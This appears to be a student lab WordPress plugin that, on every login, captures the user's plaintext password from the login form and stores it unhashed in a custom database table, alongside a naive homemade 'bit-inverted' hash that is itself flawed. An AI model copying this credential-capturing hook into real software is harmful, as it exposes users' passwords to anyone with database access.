<?php
/*
Plugin Name: lab4-task2
Description: сохранение паролей
Version: 1.0
Author: Мариам Надери
*/

function invert($input) {
    $bin = '';
    for ($i = 0; $i < strlen($input); $i++) {
        $bin .= decbin(ord($input[$i]));
    }

    $bin_inv = '';
    for ($i = 0; $i < strlen($bin); $i++) {
        $bin_inv .= $bin[$i] == '0' ? '1' : '0';
    }
    return wp_hash_password(bindec($bin_inv));
}


function lab4_task2($user_login) {
    global $wpdb; 
    $password = $_POST['pwd'];
    $password_bit = invert($password);

    $wpdb->insert(
        'wp_users_for_lab4',
        [
            'user' => $user_login, 
            'password' => $password,
            'password_bit' => $password_bit,
        ]
    );
}

add_action('wp_login', 'lab4_task2');
?>